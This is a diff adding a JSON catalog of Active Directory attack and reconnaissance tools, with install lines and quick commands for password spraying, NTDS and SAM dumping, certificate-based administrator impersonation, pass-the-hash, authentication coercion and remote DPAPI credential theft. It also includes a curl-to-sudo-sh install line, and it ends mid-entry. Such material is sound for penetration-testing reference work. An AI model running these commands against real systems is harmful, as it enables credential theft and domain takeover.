@@ -1,0 +1,2690 @@
+[
+  {
+    "id": "bloodhound",
+    "name": "BloodHound",
+    "tagline": "Six Degrees of Domain Admin - Graph-based Active Directory attack path discovery",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "popular",
+    "purpose_summary": "Uncover hidden, complex attack paths to Domain Admin using graph theory and ACL relationship mapping.",
+    "purposes": [
+      "active directory attack path visualization",
+      "find domain admin shortest path",
+      "ad graph analysis",
+      "acl abuse mapping",
+      "kerberoasting path",
+      "domain escalation"
+    ],
+    "distros": {
+      "blackarch": "pacman -S bloodhound bloodhound-python",
+      "arch": "yay -S bloodhound bloodhound-python",
+      "debian": "sudo apt install bloodhound neo4j -y && pip install bloodhound",
+      "git": "git clone https://github.com/SpecterOps/BloodHound.git\n# Python collector:\ngit clone https://github.com/dirkjanm/BloodHound.py.git && cd BloodHound.py && pip install ."
+    },
+    "repo_url": "https://github.com/SpecterOps/BloodHound",
+    "repo_type": "github",
+    "official_url": "https://bloodhound.specterops.io/",
+    "research_links": [
+      {
+        "title": "HackTricks - BloodHound Active Directory",
+        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound"
+      },
+      {
+        "title": "Medium - Unlocking Hidden Paths in Active Directory",
+        "url": "https://medium.com/@infosec/active-directory-bloodhound-guide"
+      },
+      {
+        "title": "BlackArch Tools - BloodHound",
+        "url": "https://blackarch.org/tools.html"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Run Python Ingestor",
+        "cmd": "bloodhound-python -u 'Username' -p 'Password' -ns 10.10.10.1 -d domain.local -c All"
+      },
+      {
+        "label": "Start Neo4j Backend",
+        "cmd": "sudo neo4j console"
+      },
+      {
+        "label": "Launch GUI Client",
+        "cmd": "bloodhound --no-sandbox"
+      }
+    ],
+    "notes": "Requires Neo4j database service running. BloodHound.py is the premier stealthy collector from non-domain-joined Linux systems."
+  },
+  {
+    "id": "certipy",
+    "name": "Certipy",
+    "tagline": "Active Directory Certificate Services (AD CS) enumeration and exploitation tool",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "popular",
+    "purpose_summary": "Enumerate misconfigured Active Directory Certificate Services (AD CS) templates and exploit ESC1 through ESC13 to impersonate Domain Admins.",
+    "purposes": [
+      "ad cs exploitation",
+      "adcs certificate attack",
+      "esc1 esc8 attack",
+      "active directory pki abuse",
+      "request domain admin certificate",
+      "golden certificate attack"
+    ],
+    "distros": {
+      "blackarch": "pacman -S certipy",
+      "arch": "yay -S certipy-ad-git",
+      "debian": "pipx install certipy-ad || pip install certipy-ad",
+      "git": "git clone https://github.com/ly4k/Certipy.git && cd Certipy && pip install ."
+    },
+    "repo_url": "https://github.com/ly4k/Certipy",
+    "repo_type": "github",
+    "official_url": "https://github.com/ly4k/Certipy",
+    "research_links": [
+      {
+        "title": "HackTricks - AD CS Certificate Abuse (ESC1-ESC13)",
+        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation"
+      },
+      {
+        "title": "Medium - Exploiting Active Directory Certificate Services",
+        "url": "https://medium.com/@ly4k/certified-pre-owned-adcs-with-certipy"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Enumerate Vulnerable Templates",
+        "cmd": "certipy find -u 'user@corp.local' -p 'Pass123' -dc-ip 10.10.10.1 -vulnerable -stdout"
+      },
+      {
+        "label": "Request Vuln Cert (ESC1)",
+        "cmd": "certipy req -u 'user@corp.local' -p 'Pass123' -target dc01.corp.local -ca 'CORP-CA' -template 'VulnTemplate' -upn 'administrator@corp.local'"
+      },
+      {
+        "label": "Authenticate with Certificate (PKINIT)",
+        "cmd": "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1"
+      }
+    ],
+    "notes": "One of the highest-impact AD vectors today. Can dump NT hashes and request TGTs directly using requested certificates."
+  },
+  {
+    "id": "netexec",
+    "name": "NetExec (nxc)",
+    "tagline": "The Network Execution Tool - Swiss Army knife for pentesting Active Directory & networks",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "popular",
+    "purpose_summary": "Automate assessment of large Active Directory networks, execute commands via SMB/WinRM/WMI, dump NTDS.dit hashes, and spray credentials.",
+    "purposes": [
+      "active directory credential spraying",
+      "dump ntds.dit",
+      "smb lateral movement",
+      "password spraying smb rdp winrm",
+      "crackmapexec successor",
+      "extract sam and lsass"
+    ],
+    "distros": {
+      "blackarch": "pacman -S netexec",
+      "arch": "yay -S netexec",
+      "debian": "pipx install git+https://github.com/Pennyw0rth/NetExec || pip install netexec",
+      "git": "git clone https://github.com/Pennyw0rth/NetExec.git && cd NetExec && poetry install"
+    },
+    "repo_url": "https://github.com/Pennyw0rth/NetExec",
+    "repo_type": "github",
+    "official_url": "https://www.netexec.org/",
+    "research_links": [
+      {
+        "title": "NetExec Official Documentation",
+        "url": "https://www.netexec.org/"
+      },
+      {
+        "title": "HackTricks - NetExec Cheatsheet & Modules",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/crackmapexec-cheatsheet"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Password Spraying SMB",
+        "cmd": "nxc smb 10.10.10.0/24 -u users.txt -p 'Welcome2024!' --continue-on-success"
+      },
+      {
+        "label": "Dump NTDS.dit via VSS",
+        "cmd": "nxc smb 10.10.10.10 -u 'admin' -p 'pass' --ntds"
+      },
+      {
+        "label": "Check Pre-Auth Not Required (AS-REP)",
+        "cmd": "nxc smb 10.10.10.10 -u users.txt -p '' --asreproast asrep.txt"
+      }
+    ],
+    "notes": "NetExec is the active community fork and successor to CrackMapExec (CME). Supports SMB, WMI, WinRM, LDAP, RDP, SSH, FTP, MSSQL, VNC."
+  },
+  {
+    "id": "impacket",
+    "name": "Impacket",
+    "tagline": "Premier Python library and toolkit for programmatic network protocol exploitation",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "popular",
+    "purpose_summary": "Perform low-level network protocol manipulation, pass-the-hash attacks, Kerberoasting (GetUserSPNs), psexec, secretsdump, and wmiexec.",
+    "purposes": [
+      "pass the hash attack",
+      "secretsdump ntds sam lsa",
+      "kerberoasting getuserspns",
+      "psexec lateral movement",
+      "wmiexec dcomexec",
+      "ntlm relaying ntlmrelayx"
+    ],
+    "distros": {
+      "blackarch": "pacman -S impacket",
+      "arch": "pacman -S python-impacket || yay -S python-impacket",
+      "debian": "sudo apt install python3-impacket impacket-scripts -y",
+      "git": "git clone https://github.com/fortra/impacket.git && cd impacket && pip install ."
+    },
+    "repo_url": "https://github.com/fortra/impacket",
+    "repo_type": "github",
+    "official_url": "https://www.secureauth.com/labs/open-source-tools/impacket/",
+    "research_links": [
+      {
+        "title": "HackTricks - Impacket Suite Guide",
+        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology"
+      },
+      {
+        "title": "Medium - Mastering Impacket Tools for Red Teaming",
+        "url": "https://medium.com/@infosectips/mastering-impacket-tools"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Dump SAM & LSA & NTDS",
+        "cmd": "impacket-secretsdump 'DOMAIN/User:Password@10.10.10.10'"
+      },
+      {
+        "label": "Kerberoast SPNs",
+        "cmd": "impacket-GetUserSPNs 'DOMAIN/User:Password' -dc-ip 10.10.10.1 -request"
+      },
+      {
+        "label": "WMI Command Execution",
+        "cmd": "impacket-wmiexec 'DOMAIN/Admin:Password@10.10.10.10'"
+      }
+    ],
+    "notes": "The backbone of modern Windows and Active Directory exploitation. Essential scripts include secretsdump, wmiexec, psexec, ntlmrelayx."
+  },
+  {
+    "id": "coercer",
+    "name": "Coercer",
+    "tagline": "Automate Windows authentication coercion over 12+ RPC protocols",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "rare",
+    "purpose_summary": "Force remote Windows servers and Domain Controllers to authenticate back to your machine over SMB/WebDAV using 12+ RPC interfaces (PetitPotam, DFSNM, PrinterBug, etc.).",
+    "purposes": [
+      "coerce windows authentication",
+      "coerce dc auth",
+      "petitpotam alternative",
+      "ntlm relay trigger",
+      "rpc coercion exploit",
+      "force machine authentication"
+    ],
+    "distros": {
+      "blackarch": "pacman -S coercer",
+      "arch": "yay -S coercer",
+      "debian": "pipx install coercer || pip install coercer",
+      "git": "git clone https://github.com/p0dalirius/Coercer.git && cd Coercer && pip install ."
+    },
+    "repo_url": "https://github.com/p0dalirius/Coercer",
+    "repo_type": "github",
+    "official_url": "https://github.com/p0dalirius/Coercer",
+    "research_links": [
+      {
+        "title": "HackTricks - Coercing Windows Authentication Methods",
+        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-cheatsheet"
+      },
+      {
+        "title": "Medium - Comprehensive Guide to Windows Auth Coercion",
+        "url": "https://medium.com/@podalirius/coercing-authentication-in-active-directory"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Scan Supported Coerce Methods",
+        "cmd": "coercer scan -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.10"
+      },
+      {
+        "label": "Coerce Auth to Listener IP",
+        "cmd": "coercer coerce -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.10 -l 10.10.14.5 --always-continue"
+      }
+    ],
+    "notes": "Rare underground gem created by Podalirius. Merges all known coerce methods (MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP) into one tool."
+  },
+  {
+    "id": "donpapi",
+    "name": "DonPAPI",
+    "tagline": "Dump DPAPI secrets, passwords & credentials remotely across AD",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "rare",
+    "purpose_summary": "Remotely collect DPAPI protected credentials (browser saved passwords, WiFi keys, RDP creds, vault secrets, Outlook passwords) from targeted Windows domain machines.",
+    "purposes": [
+      "dump dpapi secrets remotely",
+      "extract chrome passwords domain",
+      "steal rdp credentials remote",
+      "dpapi backup key exploitation",
+      "credman dump remotely"
+    ],
+    "distros": {
+      "blackarch": "pacman -S donpapi",
+      "arch": "yay -S donpapi-git",
+      "debian": "pipx install donpapi || pip install donpapi",
+      "git": "git clone https://github.com/login-securite/DonPAPI.git && cd DonPAPI && pip install ."
+    },
+    "repo_url": "https://github.com/login-securite/DonPAPI",
+    "repo_type": "github",
+    "official_url": "https://github.com/login-securite/DonPAPI",
+    "research_links": [
+      {
+        "title": "HackTricks - DPAPI Extraction & Decryption",
+        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords"
+      },
+      {
+        "title": "Medium - Hunting DPAPI Secrets Across the Domain",
+        "url": "https://medium.com/@login-securite/donpapi-remote-dpapi-dumper"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Dump DPAPI with Domain Admin",
+        "cmd": "donpapi -u 'Admin' -p 'Password' -d 'corp.local' -t 10.10.10.0/24"
+      },
+      {
+        "label": "Dump Using DPAPI Backup Key (PVK)",
+        "cmd": "donpapi -u 'Admin' -p 'Pass' -d 'corp.local' --pvk backupkey.pvk -t 10.10.10.50"
+      }
+    ],
+    "notes": "Obscure tool that turns domain compromise into mass browser password and credential extraction without running Mimikatz on endpoint targets."
+  },
+  {
+    "id": "snaffler",
+    "name": "Snaffler",
+    "tagline": "Autonomous tool for searching Windows domain shares for juicy passwords and keys",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "popular",
+    "purpose_summary": "Crawls all accessible SMB shares across an Active Directory forest to find passwords, SSH keys, certificates, configuration files, and secrets in real-time.",
+    "purposes": [
+      "find passwords in smb shares",
+      "active directory share enumeration",
+      "hunt configuration files secrets",
+      "discover private ssh keys network",
+      "crawling file servers ad"
+    ],
+    "distros": {
+      "blackarch": "pacman -S snaffler",
+      "arch": "yay -S snaffler-bin",
+      "debian": "sudo apt install mono-complete -y && wget https://github.com/SnaffCon/Snaffler/releases/latest/download/Snaffler.exe",
+      "git": "git clone https://github.com/SnaffCon/Snaffler.git && dotnet build -c Release"
+    },
+    "repo_url": "https://github.com/SnaffCon/Snaffler",
+    "repo_type": "github",
+    "official_url": "https://github.com/SnaffCon/Snaffler",
+    "research_links": [
+      {
+        "title": "HackTricks - Snaffler Active Directory Share Hunting",
+        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#snaffler"
+      },
+      {
+        "title": "Medium - Finding Secrets in File Shares with Snaffler",
+        "url": "https://medium.com/@pentestgeek/snaffling-ad-shares"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Snaffle Whole Domain (Console Out)",
+        "cmd": "Snaffler.exe -s -d domain.local -o snaffler.log -v data"
+      },
+      {
+        "label": "Target Specific File Server",
+        "cmd": "Snaffler.exe -t 10.10.10.20 -v data -o target_secrets.log"
+      }
+    ],
+    "notes": "Color-coded severity output (Red = Critical Passwords/Keys). Highly optimized multithreaded share crawler."
+  },
+  {
+    "id": "responder",
+    "name": "Responder",
+    "tagline": "LLMNR, NBT-NS, and MDNS poisoner with built-in rogue authentication servers",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "popular",
+    "purpose_summary": "Steal Windows NetNTLMv1/v2 password hashes by poisoning multicast name queries on the local subnet when machines query nonexistent network paths.",
+    "purposes": [
+      "capture netntlm hashes",
+      "llmnr poisoner",
+      "nbt-ns spoofing",
+      "capture windows passwords network",
+      "wpad proxy injection attack"
+    ],
+    "distros": {
+      "blackarch": "pacman -S responder",
+      "arch": "pacman -S responder || yay -S responder",
+      "debian": "sudo apt install responder -y",
+      "git": "git clone https://github.com/SpiderLabs/Responder.git && cd Responder"
+    },
+    "repo_url": "https://github.com/SpiderLabs/Responder",
+    "repo_type": "github",
+    "official_url": "https://github.com/SpiderLabs/Responder",
+    "research_links": [
+      {
+        "title": "HackTricks - NetNTLM Poisoning with Responder",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mDNS-dns-and-wpad-and-relay-attacks"
+      },
+      {
+        "title": "Medium - The Power of Responder in Internal Pentests",
+        "url": "https://medium.com/@redteam/capturing-hashes-with-responder"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Listen & Poison on Interface",
+        "cmd": "sudo responder -I eth0 -rdwv"
+      },
+      {
+        "label": "Analyze Network Traffic Without Poisoning",
+        "cmd": "sudo responder -I eth0 -A"
+      }
+    ],
+    "notes": "Essential internal network pivot tool. NetNTLMv2 hashes captured are stored in /logs/ for offline cracking with Hashcat mode 5600."
+  },
+  {
+    "id": "evil-winrm",
+    "name": "Evil-WinRM",
+    "tagline": "The ultimate Windows Remote Management (WinRM) hacking shell",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "popular",
+    "purpose_summary": "Gain an interactive PowerShell shell on Windows machines with WinRM enabled (5985/5986), execute in-memory scripts, bypass AMSI, and load C# assemblies.",
+    "purposes": [
+      "interactive winrm shell",
+      "powershell remote hacking",
+      "pass the hash winrm",
+      "amsi bypass remote shell",
+      "load c# assemblies winrm"
+    ],
+    "distros": {
+      "blackarch": "pacman -S evil-winrm",
+      "arch": "yay -S evil-winrm",
+      "debian": "sudo gem install evil-winrm",
+      "git": "git clone https://github.com/Hackplayers/evil-winrm.git && cd evil-winrm && gem install bundler && bundle install"
+    },
+    "repo_url": "https://github.com/Hackplayers/evil-winrm",
+    "repo_type": "github",
+    "official_url": "https://github.com/Hackplayers/evil-winrm",
+    "research_links": [
+      {
+        "title": "HackTricks - WinRM Pentesting & Evil-WinRM",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm"
+      },
+      {
+        "title": "Medium - Evil-WinRM: Advanced Features & Post-Exploitation",
+        "url": "https://medium.com/@hackplayers/evil-winrm-the-ultimate-winrm-shell"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Connect with Cleartext Creds",
+        "cmd": "evil-winrm -i 10.10.10.10 -u Administrator -p 'Password123'"
+      },
+      {
+        "label": "Pass-the-Hash Connection",
+        "cmd": "evil-winrm -i 10.10.10.10 -u Administrator -H '32ed87b4072a4a9e14b3b70634dbbedc'"
+      },
+      {
+        "label": "In-Memory Script & AMSI Bypass",
+        "cmd": "evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/ -e /opt/exes/"
+      }
+    ],
+    "notes": "Built-in commands include `menu`, `upload`, `download`, `services`, `Bypass-4MSI`, `Dll-Loader`."
+  },
+  {
+    "id": "pywerview",
+    "name": "PywerView",
+    "tagline": "Pure Python implementation of PowerSploit's PowerView for Linux attackers",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "rare",
+    "purpose_summary": "Enumerate Active Directory domains, users, groups, computer objects, SPNs, local admin relationships, and GPOs completely from a Linux terminal without PowerShell.",
+    "purposes": [
+      "powerview on linux",
+      "python active directory enumeration",
+      "enumerate gpo domain linux",
+      "find local admin privileges linux"
+    ],
+    "distros": {
+      "blackarch": "pacman -S pywerview",
+      "arch": "yay -S python-pywerview-git",
+      "debian": "pipx install pywerview || pip install pywerview",
+      "git": "git clone https://github.com/the-useless-one/pywerview.git && cd pywerview && pip install ."
+    },
+    "repo_url": "https://github.com/the-useless-one/pywerview",
+    "repo_type": "github",
+    "official_url": "https://github.com/the-useless-one/pywerview",
+    "research_links": [
+      {
+        "title": "HackTricks - PowerView / PywerView Cheatsheet",
+        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Enumerate Domain Controllers",
+        "cmd": "pywerview get-netdomaincontroller -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.1"
+      },
+      {
+        "label": "Find Local Admins",
+        "cmd": "pywerview get-netlocalgroup -u 'user' -p 'pass' -d 'corp.local' -t 10.10.10.20 -c 'Administrators'"
+      }
+    ],
+    "notes": "Perfect for stealthy Active Directory reconnaissance directly from Arch / Debian Kali setups."
+  },
+  {
+    "id": "kerbrute",
+    "name": "Kerbrute",
+    "tagline": "Quickly bruteforce and enumerate valid Active Directory accounts via Kerberos Pre-Authentication",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "popular",
+    "purpose_summary": "Enumerate valid AD usernames stealthily and perform password spray attacks without generating failed logon events (event 4625) in Windows Security event logs.",
+    "purposes": [
+      "kerberos username enumeration",
+      "stealthy ad password spray",
+      "active directory user bruteforce",
+      "no lockout ad enumeration"
+    ],
+    "distros": {
+      "blackarch": "pacman -S kerbrute",
+      "arch": "yay -S kerbrute-bin",
+      "debian": "go install github.com/ropnop/kerbrute@latest || wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64",
+      "git": "git clone https://github.com/ropnop/kerbrute.git && cd kerbrute && make"
+    },
+    "repo_url": "https://github.com/ropnop/kerbrute",
+    "repo_type": "github",
+    "official_url": "https://github.com/ropnop/kerbrute",
+    "research_links": [
+      {
+        "title": "HackTricks - Kerbrute Active Directory",
+        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerbrute"
+      },
+      {
+        "title": "Ropnop Blog - Faster AD Enumeration with Kerberos",
+        "url": "https://blog.ropnop.com/practical-usage-of-kerbrute/"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "User Enumeration",
+        "cmd": "kerbrute userenum --dc 10.10.10.1 -d corp.local users.txt"
+      },
+      {
+        "label": "Password Spray (Safe Lockout)",
+        "cmd": "kerbrute passwordspray --dc 10.10.10.1 -d corp.local valid_users.txt 'Winter2024!'"
+      }
+    ],
+    "notes": "Fastest and quietest way to validate Active Directory users from external network positions."
+  },
+  {
+    "id": "kekeo",
+    "name": "Kekeo",
+    "tagline": "Pure C toolkit for Kerberos manipulation, Pass-the-Ticket, and Golden/Silver ticket forging",
+    "category": "Active Directory & Windows Attack",
+    "rarity": "rare",
+    "purpose_summary": "Perform advanced Kerberos manipulation, forge S4U2self / S4U2proxy tickets, request TGS without pre-auth, and craft custom Kerberos requests.",
+    "purposes": [
+      "kerberos ticket forging",
+      "s4u2proxy ticket manipulation",
+      "pass the ticket kekeo",
+      "kerberos raw manipulation c"
+    ],
+    "distros": {
+      "blackarch": "pacman -S kekeo",
+      "arch": "yay -S kekeo-bin",
+      "debian": "wget https://github.com/gentilkiwi/kekeo/releases/latest/download/kekeo.zip && unzip kekeo.zip",
+      "git": "git clone https://github.com/gentilkiwi/kekeo.git"
+    },
+    "repo_url": "https://github.com/gentilkiwi/kekeo",
+    "repo_type": "github",
+    "official_url": "https://github.com/gentilkiwi/kekeo",
+    "research_links": [
+      {
+        "title": "HackTricks - Kerberos Attacks & Kekeo",
+        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Request TGT using NTLM Hash",
+        "cmd": "kekeo.exe \"tgt::ask /user:Administrator /domain:corp.local /ntlm:32ed87b4072a4a9e14b3b70634dbbedc\""
+      },
+      {
+        "label": "S4U Constrained Delegation Abuse",
+        "cmd": "kekeo.exe \"tgs::s4u /tgt:TGT.kirbi /user:Administrator@corp.local /service:cifs/target.corp.local\""
+      }
+    ],
+    "notes": "Created by Benjamin Delpy (author of Mimikatz). Essential for specialized Kerberos protocol research."
+  },
+  {
+    "id": "nuclei",
+    "name": "Nuclei",
+    "tagline": "Fast, template-powered vulnerability scanner designed for modern web & cloud surfaces",
+    "category": "Reconnaissance & OSINT",
+    "rarity": "popular",
+    "purpose_summary": "Scan domains and web apps for thousands of known CVEs, 0days, misconfigurations, and leaked credentials using community-driven YAML templates.",
+    "purposes": [
+      "automated vulnerability scanning",
+      "cve scanning",
+      "yaml templates exploit scanner",
+      "bug bounty automated recon",
+      "exposed panels detection",
+      "takeover and leak detection"
+    ],
+    "distros": {
+      "blackarch": "pacman -S nuclei",
+      "arch": "pacman -S nuclei || yay -S nuclei-bin",
+      "debian": "sudo apt install nuclei -y || go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
+      "git": "git clone https://github.com/projectdiscovery/nuclei.git && cd nuclei/v3/cmd/nuclei && go build"
+    },
+    "repo_url": "https://github.com/projectdiscovery/nuclei",
+    "repo_type": "github",
+    "official_url": "https://nuclei.projectdiscovery.io/",
+    "research_links": [
+      {
+        "title": "Nuclei Official Documentation",
+        "url": "https://docs.projectdiscovery.io/tools/nuclei/"
+      },
+      {
+        "title": "HackTricks - Nuclei Vulnerability Hunting",
+        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nuclei"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Update Templates",
+        "cmd": "nuclei -ut"
+      },
+      {
+        "label": "Scan Target List with Criticals/Highs",
+        "cmd": "nuclei -l targets.txt -s critical,high -o vuln_results.txt"
+      },
+      {
+        "label": "Target Specific CVE",
+        "cmd": "nuclei -u https://target.com -tags cve,auth-bypass"
+      }
+    ],
+    "notes": "The industry standard for rapid bug bounty and penetration testing validation. Thousands of updated community templates."
+  },
+  {
+    "id": "amass",
+    "name": "OWASP Amass",
+    "tagline": "In-depth attack surface mapping and external asset discovery",
+    "category": "Reconnaissance & OSINT",
+    "rarity": "popular",
+    "purpose_summary": "Map an organization's entire external attack surface through DNS harvesting, certificate transparency logs, routing ASN queries, and graph databases.",
+    "purposes": [
+      "attack surface mapping",
+      "subdomain enumeration",
+      "asn network discovery",
+      "passive osint recon",
+      "dns certificate discovery"
+    ],
+    "distros": {
+      "blackarch": "pacman -S amass",
+      "arch": "pacman -S amass || yay -S amass",
+      "debian": "sudo apt install amass -y || go install -v github.com/owasp-amass/amass/v4/...@master",
+      "git": "git clone https://github.com/owasp-amass/amass.git && cd amass && go install ./..."
+    },
+    "repo_url": "https://github.com/owasp-amass/amass",
+    "repo_type": "github",
+    "official_url": "https://owasp.org/www-project-amass/",
+    "research_links": [
+      {
+        "title": "OWASP Amass User Guide",
+        "url": "https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md"
+      },
+      {
+        "title": "HackTricks - Amass External Recon",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology#amass"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Passive Subdomain Enum",
+        "cmd": "amass enum -passive -d target.com -o subdomains_passive.txt"
+      },
+      {
+        "label": "Active Enum with ASN & DNS Resolvers",
+        "cmd": "amass enum -active -d target.com -rf resolvers.txt -brute -w words.txt"
+      }
+    ],
+    "notes": "Integrates with 80+ OSINT data sources via API keys configured in config.ini."
+  },
+  {
+    "id": "katana",
+    "name": "Katana",
+    "tagline": "Next-generation crawling and spidering framework for web & API endpoint discovery",
+    "category": "Reconnaissance & OSINT",
+    "rarity": "popular",
+    "purpose_summary": "Crawl Single Page Apps (SPA), JavaScript-heavy websites, and standard web applications with headless browser support to extract hidden URLs and endpoints.",
+    "purposes": [
+      "web crawler spider",
+      "javascript endpoint extractor",
+      "headless browser crawler",
+      "find hidden api routes",
+      "deep url discovery"
+    ],
+    "distros": {
+      "blackarch": "pacman -S katana",
+      "arch": "yay -S katana-bin",
+      "debian": "go install github.com/projectdiscovery/katana/cmd/katana@latest",
+      "git": "git clone https://github.com/projectdiscovery/katana.git && cd katana/cmd/katana && go build"
+    },
+    "repo_url": "https://github.com/projectdiscovery/katana",
+    "repo_type": "github",
+    "official_url": "https://github.com/projectdiscovery/katana",
+    "research_links": [
+      {
+        "title": "ProjectDiscovery Katana Docs",
+        "url": "https://docs.projectdiscovery.io/tools/katana"
+      },
+      {
+        "title": "Medium - Advanced Endpoint Hunting with Katana",
+        "url": "https://medium.com/@projectdiscovery/katana-next-generation-crawling"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Standard Web Crawl",
+        "cmd": "katana -u https://example.com -d 3 -jc -o endpoints.txt"
+      },
+      {
+        "label": "Headless Chrome Crawl (JS-heavy)",
+        "cmd": "katana -u https://example.com -headless -system-chrome -o js_endpoints.txt"
+      }
+    ],
+    "notes": "Handles DOM parsing, XHR calls, JS regex extraction, and form field discovery out of the box."
+  },
+  {
+    "id": "bbrf",
+    "name": "BBRF (Bug Bounty Repo Feeder)",
+    "tagline": "Centralized, distributed asset and recon coordination database",
+    "category": "Reconnaissance & OSINT",
+    "rarity": "rare",
+    "purpose_summary": "Synchronize discovered subdomains, IP addresses, URLs, and ports across multiple VPS servers into a unified CouchDB backend for recon automation.",
+    "purposes": [
+      "distributed recon database",
+      "bug bounty asset tracker",
+      "sync subdomains across vps",
+      "pipeline coordinator",
+      "collaborative reconnaissance"
+    ],
+    "distros": {
+      "blackarch": "pacman -S bbrf-client",
+      "arch": "yay -S bbrf-client-git",
+      "debian": "pipx install bbrf-client || pip install bbrf-client",
+      "git": "git clone https://github.com/honoki/bbrf-client.git && cd bbrf-client && pip install ."
+    },
+    "repo_url": "https://github.com/honoki/bbrf-client",
+    "repo_type": "github",
+    "official_url": "https://github.com/honoki/bbrf-client",
+    "research_links": [
+      {
+        "title": "Medium - Distributed Bug Hunting with BBRF",
+        "url": "https://medium.com/@honoki/how-to-manage-your-recon-data-with-bbrf-6c167b556b68"
+      },
+      {
+        "title": "HackTricks - Recon Workflows",
+        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Add New Program Scope",
+        "cmd": "bbrf use myprogram && bbrf inscope add '*.target.com'"
+      },
+      {
+        "label": "Pipe Discovered Domains to BBRF",
+        "cmd": "subfinder -d target.com | bbrf domain add - -s subfinder"
+      }
+    ],
+    "notes": "Beloved by top bug bounty hunters running continuous background asset scanners."
+  },
+  {
+    "id": "puredns",
+    "name": "Puredns",
+    "tagline": "Fast, accurate DNS bruteforcer and resolver with wildcard elimination",
+    "category": "Reconnaissance & OSINT",
+    "rarity": "popular",
+    "purpose_summary": "Bruteforce millions of subdomains at high speed while automatically filtering out DNS wildcard pollution using public trusted resolvers.",
+    "purposes": [
+      "dns bruteforcing",
+      "wildcard dns filtering",
+      "fast mass dns resolution",
+      "subdomain discovery"
+    ],
+    "distros": {
+      "blackarch": "pacman -S puredns",
+      "arch": "yay -S puredns-bin",
+      "debian": "sudo apt install massdns -y && go install github.com/d3mondev/puredns/v2@latest",
+      "git": "git clone https://github.com/d3mondev/puredns.git && cd puredns && go build"
+    },
+    "repo_url": "https://github.com/d3mondev/puredns",
+    "repo_type": "github",
+    "official_url": "https://github.com/d3mondev/puredns",
+    "research_links": [
+      {
+        "title": "Medium - Eliminating Wildcard False Positives with Puredns",
+        "url": "https://medium.com/@d3mondev/puredns-mass-dns-resolver"
+      }
+    ],
+    "quick_commands": [
+      {
+        "label": "Bruteforce Subdomains",
+        "cmd": "puredns bruteforce wordlist.txt target.com -r resolvers.txt -w resolved.txt"
+      },
+      {
+        "label": "Resolve Subdomain List",
+        "cmd": "puredns resolve subdomains.txt -r resolvers.txt -w valid_hosts.txt"
+      }
+    ],
+    "notes": "Requires MassDNS installed as backend engine. Unbeatable accuracy against wildcard DNS tricks."
+  },
+  {
+    "id": "trufflehog",
+    "name": "TruffleHog",
+    "tagline": "High-speed credential and secret detector for git, filesystems, and S3",
+    "category": "Reconnaissance & OSINT",
+    "rarity": "popular",
+    "purpose_summary": "Scan git commit history, repositories, filesystem directories, and AWS S3 buckets for 800+ credential types with automatic live verification.",
+    "purposes": [
+      "detect api key leaks",
+      "scan git history for passwords",
+      "find leaked aws keys",
+      "credential leak discovery",
+      "s3 bucket secret hunting"
+    ],
+    "distros": {
+      "blackarch": "pacman -S trufflehog",
+      "arch": "yay -S trufflehog-bin",
+      "debian": "curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin",
+      "git": "git clone https://github.com/trufflesecurity/trufflehog.git && cd trufflehog && go build"
+    },
+    "repo_url": "https://github.com/trufflesecurity/trufflehog",
+    "repo_type": "github",
+    "official_url": "https://trufflesecurity.com/trufflehog",
+    "research_links": [
+      {
+        "title": "HackTricks - Secret Hunting & Leak Detection",
